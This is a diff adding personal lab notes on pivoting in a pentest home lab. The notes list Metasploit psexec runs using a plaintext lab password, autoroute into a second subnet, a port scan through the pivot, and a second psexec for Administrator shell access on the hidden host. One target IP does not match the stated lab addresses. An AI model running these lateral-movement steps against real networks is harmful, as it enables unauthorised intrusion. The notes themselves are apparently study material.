@@ -1,0 +1,88 @@
+--Lab Setup--
+
+Windows 10 Machine: 
+Logged as "fcastle"
+2 Network Interface Cards, IPs:
+- 192.168.202.4
+- 10.10.10.3 
+
+
+Windows 10 Machine (Fsecurity One):
+Logged as "pparker"
+1 Network Interface Card, IP:
+- 10.10.10.4
+
+
+Windows 2016 Machine:
+Logged as "Administrator"
+2 Network Interface Cards, IPs:
+- 192.168.202.5
+- 10.10.10.5
+
+
+Kali Machine (This machine):
+1 Network Interface Card, IP:
+- 192.168.202.6
+
+
+The idea is that only "Fcastle" Windows 10 machine can reach "pparker" Windows 10 machine, but NOT Kali. So we will use Pivoting to communicate with pparker machine by means of fcastle machine.
+
+On Kali we send the psexec exploit again
+msf > use exploit/windows/smb/psexec
+msf > set RHOSTS 192.168.2.4
+msf > set SMBDomain marvel
+msf > set SMBPass Kawaninjazx6r
+msf > set SMBUser fcastle
+msf > set target 2
+msf > run
+
+Once we get the session back
+msf > run autoroute -p -> No routes added at this point
+
+Autorun module enables other modules to 'pivot' through a compromised 
+host when connecting to the named NETWORK and SUBMASK, via the meterpreter session open, so what we want
+is that whenever we want to go to 10.10.10.0/24 networks, proxy that connection through the meterpreter session
+with the compromised machine (fcastle windows 10, as this machine can communicate with pparker win 10 machine which is is on 10.10.10.0/24 network)
+msf > run autoroute -s 10.10.10.0/24
+ 
+We can see the route indeed added:
+msf > bg
+msf5 exploit(windows/smb/psexec) > route
+IPv4 Active Routing Table
+=========================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   10.10.10.0         255.255.255.0      Session 2
+
+In real life, to know if a machine is multi-home (has 2 network interfaces), is simply checking its network-related config. Example by using this compromised fcastle machine:
+msf > shell
+C:\> route print
+C:\> arp -a
+C:\> netstat
+C:\> ipconfig
+In all above, you will see 2 or 3 or more networm segments, meaninig it is multi-home. Also check the interfaces (ipconfig).
+
+
+Now that we have pivot access to pparker computer network, we can scan ports open for that computer. Background the open session in meterpreter:
+msf > bg
+msf > use auxiliary/scanner/portscan/tcp
+msf > set RHOSTS 10.10.10.4 -> pparker Win 10 PC
+msf > set PORTS 1-1024
+msf > run
+
+Scanning through pivoting is super slow, so be patient.
+
+Once we have the ports, we can also use pivoting for Command Shell access through SMB.
+msf > exploit/windows/smb/psexec
+msf5 exploit(windows/smb/psexec) > set RHOSTS 10.10.10.4
+RHOSTS => 10.10.10.4
+msf5 exploit(windows/smb/psexec) > set LPORT 5555
+LPORT => 5555
+msf5 exploit(windows/smb/psexec) > set SMBUser Administrator
+SMBUser => Administrator
+msf5 exploit(windows/smb/psexec) > run
+
+We will be pivoting through the compromised fcastle machine to gain shell access to pparker machine (10.10.10.4) as an Administrator user
+
+
